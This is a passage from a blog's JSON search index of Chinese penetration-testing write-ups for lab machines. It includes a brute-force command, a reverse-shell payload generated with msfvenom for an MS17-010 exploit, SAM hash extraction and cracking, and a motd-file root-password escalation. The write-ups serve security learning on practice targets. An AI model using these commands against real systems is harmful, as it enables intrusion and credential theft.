/\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEda8018e18f77cf2ea0a6ec577ac7757dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e没有任何补丁：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE509e781aa6e38526e096213733c82c83image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e内核提权试试：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE87c9c9a4ef6e7a3b8aa0cf997a4692a3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE310b6501a12cf39328a35d979f49c2eeimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e上传32位的nc:\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/int0x33/nc.exe/blob/master/nc.exe\"\u003ehttps://github.com/int0x33/nc.exe/blob/master/nc.exe\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEc4e3a7d776e726e569ad4208ad021cdeimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEe3ae08c61484e306d1701a528ecf7c63image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e6988a0c5429f9c38b48a927333d8701a\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE6c35dd9d6df83c998958875edb31c3f6image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0X003 Devel"},{"content":"端口扫描 目录扫描 这里遇到一个问题，我下意识的认为靶机403没有价值所以没去看，导致错过入口\n字典收集 cewl 192.168.154.131 -w 1.txt hydry 爆破 hydra -L 1.txt -P 1.txt 192.168.154.131 http-get /webdav 这里有几个疑问，burp抓包如下：\n看数据包内可能是MD5的加密方式，但是，没发现MD5的加密数据\n同时使用wireshark抓包，如下，均未发现MD5密码的痕迹，前端又不让抓JS，有点疑惑hydry是怎么做到的\n通过查阅资料发现HTTP协议身份认证的相关知识，\n上面的例子属于DIGEST 认证(摘要认证），客户端请求时会采用质询码计算生成响应码。最后将响应码返回给接收方进行认证的方式，所以不会存在bas64编码的明文密码。\nwebdav利用 涉及一些新的内容：\nWebDAV服务漏洞利用工具DAVTest，大致看了一下，可以知道html\\php文件上传执行成功：\n上传PHP反弹shell脚本：\n提权 inferno的user.txt\n提权这里遇到的问题挺多的，进行一下记录：\n首先常规的sudo以及SUID均无法提权，所以遇到阻塞，随后，翻查敏感信息，发现了以下内容：\n主要是TIPS.txt和creds.txt，creds.txt为base64加密内容，解密出来为web爆破的密码，尝试过登录，但是没有成功：\n后续又上传了自动化工具，进行提权，但是都失败了：\n随后只能看WP了：\n发现问题，信息收集不够全面，没发现/mnt目录下的hell.sh，同时没见过BF编码：\nhttps://www.splitbrain.org/services/ook\n通过密码去尝试登录可登录的账户名：\n修改文件达到提权:\n命令为：\ncd /etc/update-motd.d/\recho \u0026#34;echo \u0026#39;root:d1no\u0026#39; | sudo chpasswd\u0026#34; \u0026gt;\u0026gt; 00-header 坑点为必须退出后，使用ssh登录，否则没有触发更新，不能提权成功：\n总结 补足以下知识点：\n1、http摘要认证 2、WEBdav利用 3、Brainfuck编码 4、00-header 文件提权 ","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x003-ha-narak/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE459cd1832e7352042ce534b82ac463ad%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"目录扫描\"\u003e目录扫描\u003c/h1\u003e\n\u003cp\u003e这里遇到一个问题，我下意识的认为靶机403没有价值所以没去看，导致错过入口\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc3203e0ab9995b5cca660f80f5b0d39a%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch2 id=\"字典收集\"\u003e字典收集\u003c/h2\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ecewl 192.168.154.131 -w 1.txt\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE619c86ff1531cc0781cd27b2e6e3bead%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch3 id=\"hydry-爆破\"\u003ehydry 爆破\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ehydra -L 1.txt -P 1.txt 192.168.154.131 http-get /webdav\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEbf08351ca395b8459b80fb7a9c998b8a%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这里有几个疑问，burp抓包如下：\u003c/p\u003e\n\u003cp\u003e看数据包内可能是MD5的加密方式，但是，没发现MD5的加密数据\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE49a8844d9c9cc2515ee4da893fcc56d2%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e同时使用wireshark抓包，如下，均未发现MD5密码的痕迹，前端又不让抓JS，有点疑惑hydry是怎么做到的\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe0a283cb172a94c140181163d835e77c%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e通过查阅资料发现HTTP协议身份认证的相关知识，\u003c/p\u003e\n\u003cp\u003e上面的例子属于DIGEST 认证(摘要认证），客户端请求时会采用质询码计算生成响应码。最后将响应码返回给接收方进行认证的方式，所以不会存在bas64编码的明文密码。\u003c/p\u003e\n\u003ch1 id=\"webdav利用\"\u003ewebdav利用\u003c/h1\u003e\n\u003cp\u003e涉及一些新的内容：\u003c/p\u003e\n\u003cp\u003eWebDAV服务漏洞利用工具DAVTest，大致看了一下，可以知道html\\php文件上传执行成功：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf59a54686243b2714c291cc8d16fb1ab%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e上传PHP反弹shell脚本：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE75384ebcd019134631c13fdfc3afbc55%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003einferno的user.txt\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE4e1a6d67a59956273ba4ab3a4127e0af%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e提权这里遇到的问题挺多的，进行一下记录：\u003c/p\u003e\n\u003cp\u003e首先常规的sudo以及SUID均无法提权，所以遇到阻塞，随后，翻查敏感信息，发现了以下内容：\u003c/p\u003e\n\u003cp\u003e主要是TIPS.txt和creds.txt，creds.txt为base64加密内容，解密出来为web爆破的密码，尝试过登录，但是没有成功：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7d95dbff73673ef17704b74ef1a17af1%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e后续又上传了自动化工具，进行提权，但是都失败了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE79eef3e89d742333d6bc61066fd732b4%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e随后只能看WP了：\u003c/p\u003e\n\u003cp\u003e发现问题，信息收集不够全面，没发现/mnt目录下的hell.sh，同时没见过BF编码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE43fcfebea100a18469d8d8d427433a4e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://www.splitbrain.org/services/ook\"\u003ehttps://www.splitbrain.org/services/ook\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8f88720599b6542d2e61700db9c289ad%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e通过密码去尝试登录可登录的账户名：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEcc47450022e0b62817d866431edce998%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e修改文件达到提权:\u003c/p\u003e\n\u003cp\u003e命令为：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ecd /etc/update-motd.d/\r\necho \u0026#34;echo \u0026#39;root:d1no\u0026#39; | sudo chpasswd\u0026#34; \u0026gt;\u0026gt; 00-header\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb74a9876258db237271160cbb82611e0%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x003 HA Narak"},{"content":"端口扫描 获取立足点 smb：\n挂载到本地：\n打开后，慢慢翻查，没有发现什么有效的东西，但是后面看了一下，最重要的是哪个backup文件夹，里面有两个和其他不一样的文件：\n借助GPT，我们可以知道是什么东西，其实是个硬盘，是硬盘就可以看：\n使用guestmount进行挂载：\n安装：\rsudo apt-get install libguestfs-tools\r使用\rsudo guestfish --rw -a 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd\rrun\rlist-filesystems ****查看要挂载的文件系统\rexit\r挂载：\rsudo guestmount -a 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd -m /dev/sda1 /mnt sam文件地址：\nC:\\WIndows\\System32\\config\\SAM SYSTEM hives地址：\nC:\\Windows\\System32\\config\\SYSTEM 把这两个文件拷贝出来：\nsamdump2 读取hash:\njohn破解ntml hash:\nbureaulampje (L4mpje)\nssh登录：\n提权 systeminfo看不到东西，查看软件目录：\n搜索信息：\n大概看一下信息：\n可以知道我们可以获取到密码：\n访问里面写的脚本网站：\n利用之前的smb传输进去，http和scp传输失败了：\n在使用脚本之前，需要先把服务开启来，否则识别不了：\n运行一下：\n失败了，不过无所谓，这个工具只是一个提取工具，手动看就行：\n打开%appdata%/mRemoteNg/路径：\n可以发现加密密码：\n使用刚刚哪个工具破解：\n得到密码：thXLHM96BeKL0ER2\nssh登录成功：\n","permalink":"https://yangzhuzai.github.io/posts/htb/0x004-bastion/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE20936b99374514d5e6ce2add517036fbimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE78871723166dee836b3bcf80aa89cb7bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE0b9f7b952b6c488dadfaf68b6a3b4497image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEbd2917511f778e19cf733f1cb967c44cimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"获取立足点\"\u003e获取立足点\u003c/h1\u003e\n\u003cp\u003esmb：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE901e48ea26c5f42847cfbec1c0ac19d4image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e挂载到本地：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE1084e891b2be7b0ed64a326eaa4ef7d4image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE15cd0f823721b338a90296ab512810d7image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e打开后，慢慢翻查，没有发现什么有效的东西，但是后面看了一下，最重要的是哪个backup文件夹，里面有两个和其他不一样的文件：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEf62a948c97343673c5df70a32bae460bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e借助GPT，我们可以知道是什么东西，其实是个硬盘，是硬盘就可以看：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEddc0d0b86fbc12fe370d2363e0107786image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e使用guestmount进行挂载：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e安装：\r\nsudo apt-get install libguestfs-tools\r\n\r\n\r\n使用\r\nsudo guestfish --rw -a 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd\r\nrun\r\nlist-filesystems  ****查看要挂载的文件系统\r\nexit\r\n挂载：\r\nsudo guestmount -a 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd -m /dev/sda1 /mnt\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEbf560e890ecfa9ba6ade9959b8c2c2a5image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE36aa2d778925d3064fa40a5274ca18a7image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003esam文件地址：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eC:\\WIndows\\System32\\config\\SAM\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eSYSTEM hives地址：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e C:\\Windows\\System32\\config\\SYSTEM\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e把这两个文件拷贝出来：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEb7cb4501d2f43017c75bef6bf5a87669image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003esamdump2 读取hash:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEa56df4487c87e17799af463c1dc86506image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ejohn破解ntml hash:\u003c/p\u003e\n\u003cp\u003ebureaulampje     (L4mpje)\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE391353a350aa7df977722483227b0e26image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003essh登录：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEb22b71fa3836d077e80b209f723d6598image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0X004 Bastion"},{"content":"开局就遇到一个问题：靶机无法获取IP地址，通过搜索解决办法记录如下：\n重启虚拟机出现VM图标的时候就需要长按shift，然后进入GRUB：\n选择第二个Advanced options for Ubuntu:\n按e编辑：\n修改\nvi /etc/netplan/00-installer-config.yaml：\n改成ens33，随后重启即可：\nIP\u0026amp;端口扫描 目录扫描： robots.txt无有效页面，但是，手滑输错，发现以下页面，根据语句意思发现mercuryfacts目录：\nweb渗透 发现提示，可能存在sql注入？\nSQL注入！：\n注入发现账号密码：\nSSH爆破 账号：webmaster\n密码：mercuryisthesizeof0.056Earths\n提权 user_flag.txt\nsudo -l 没有东西\n发现一个新的账号密码：\nlinuxmaster\nmercurymeandiameteris4880km\n可以成功切换：\nsudo -l :\n尝试运行命令，根据意思，猜想可能可以通过tail命令来进行提权：\n命令如下：\n这里有个坑点，su - 用户名可能没法用环境变量\nln -s /bin/vi tail 创建软连接\rexport PATH=.:$PATH\rsudo --preserve-env=PATH /usr/bin/check..... 使用CVE-2021-4034进行提权： ","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x004-mercury/","summary":"\u003cp\u003e开局就遇到一个问题：靶机无法获取IP地址，通过搜索解决办法记录如下：\u003c/p\u003e\n\u003cp\u003e重启虚拟机出现VM图标的时候就需要长按shift，然后进入GRUB：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE813ca0f6ce86d53c24b1862908bf683e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e选择第二个Advanced options for Ubuntu:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE41b83a18e48bf0054e408f052bb781b5%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e按e编辑：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1cac39334ab07943bfbee4d9eda8a3ee%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e修改\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf44f2aa84809261a3aab6afd2c62ae87%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003evi /etc/netplan/00-installer-config.yaml：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb851afecdc059a38417f5ca206a807f7%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e改成ens33，随后重启即可：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf450dfa90e0953af37122fdfba7632b6%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"ip端口扫描\"\u003eIP\u0026amp;端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE924bc2595f28b8fcb760f2c4281a2467%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"目录扫描\"\u003e目录扫描：\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE83fc40ba45e07807aec93f8f9e463505%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003erobots.txt无有效页面，但是，手滑输错，发现以下页面，根据语句意思发现mercuryfacts目录：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE28fcf0bc9ccb263f8edac002773aa226%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE0d51ae14207ba33901c72a41704da006%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"web渗透\"\u003eweb渗透\u003c/h1\u003e\n\u003cp\u003e发现提示，可能存在sql注入？\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa3e5cdf3841d13add279eadf42d7e5e6%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eSQL注入！：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc9542df307fb30364ea18a50b02e1231%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e注入发现账号密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8cc83d12618d2473bb14829fba7a5675%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"ssh爆破\"\u003eSSH爆破\u003c/h1\u003e\n\u003cp\u003e账号：webmaster\u003c/p\u003e\n\u003cp\u003e密码：mercuryisthesizeof0.056Earths\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE31ba0ad457a5bdf0c9912b651df1a619%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003euser_flag.txt\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd0a1311e27b1c24aeb1c6b44798a258c%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003esudo -l 没有东西\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7906d55b068b8c0719de73135367174a%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现一个新的账号密码：\u003c/p\u003e\n\u003cp\u003elinuxmaster\u003c/p\u003e\n\u003cp\u003emercurymeandiameteris4880km\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE28e0dabd793b6b4cade949157b1059e8%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e可以成功切换：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe1c27381ea1d479da806a3584c77ecf2%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003esudo -l :\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE4ee19b49f17096e466076aa7b6c43ee7%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x004 Mercury"},{"content":"端口扫描 获取立足点 本来是不太愿意用ms17-010直接打，但是看了一下smb的东西，好像也不太行：\n但是尽量不适用msf吧：\n这个失败了：\nhttps://github.com/mez-0/MS17-010-Python\n换一个：\n简书的讲解：\nhttps://www.jianshu.com/p/430b2bbfdecc\n这种方式也失败了。\n最后使用了，这个办法：\n生成一个木马：\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.15 LPORT=8889 -f exe EXITFUNC=thread -o shell.exe\n编辑zzz_exploit.py：\n添加两个\\\n这个位置，添加相关操作：\n使用vim可能会报错，可以使用记事本打开，可能是vim的问题：\n运行：\npython2 zzz_exploit.py 10.10.10.40 ntsvcs\n","permalink":"https://yangzhuzai.github.io/posts/htb/0x005-blue/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE2e5d325be6572acc6fe7225b6f12fc65image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE461282104c88e9e96c68c6156f40047fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEb84c8731af18fe56ae61f82e2ca73235image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"获取立足点\"\u003e获取立足点\u003c/h1\u003e\n\u003cp\u003e本来是不太愿意用ms17-010直接打，但是看了一下smb的东西，好像也不太行：\u003c/p\u003e\n\u003cp\u003e但是尽量不适用msf吧：\u003c/p\u003e\n\u003cp\u003e这个失败了：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/mez-0/MS17-010-Python\"\u003ehttps://github.com/mez-0/MS17-010-Python\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e换一个：\u003c/p\u003e\n\u003cp\u003e简书的讲解：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://www.jianshu.com/p/430b2bbfdecc\"\u003ehttps://www.jianshu.com/p/430b2bbfdecc\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e这种方式也失败了。\u003c/p\u003e\n\u003cp\u003e最后使用了，这个办法：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEfd8cb7031252cbea1d9f4dd8ba9d8171image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e生成一个木马：\u003c/p\u003e\n\u003cp\u003emsfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.15 LPORT=8889 -f exe EXITFUNC=thread -o shell.exe\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE3fb254004dfaa2ada5be2a32d11e02e3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e编辑zzz_exploit.py：\u003c/p\u003e\n\u003cp\u003e添加两个\\\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEaa8b069bbfe0c3ee2fbb90d26e55d862image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这个位置，添加相关操作：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE80351537bd1389c2977159194987b2e5image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e使用vim可能会报错，可以使用记事本打开，可能是vim的问题：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE84dfc6938a3d156908ed49e5df31c8a3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e运行：\u003c/p\u003e\n\u003cp\u003epython2 zzz_exploit.py 10.10.10.40 ntsvcs\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEf3cc53540399883ad12f7e55611bc064image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE06ae831433cd098b094bf047d02215f9image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE89e4c49a655b9af459755049c3e3014fimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0X005 Blue"},{"content":"端口扫描 突破 目录扫描没有东西，发现提示：\ncewl收集密码，但是没爆出来：\n查看WP，发现nmap扫描不够仔细：\ngobuster 的目录扫描同样深度不够：\nnmap扫出的是一个密钥文件：\n使用密钥连接：\n提权 user.txt\nsudo -l\nGCC SUDO提权\nroot.txt是空的？\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x005-nyx1/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa7539f990e2272d286848d0dd4b30594%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"突破\"\u003e突破\u003c/h1\u003e\n\u003cp\u003e目录扫描没有东西，发现提示：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE694d97b4d7d842dc849763041016bbe7%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003ecewl收集密码，但是没爆出来：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" 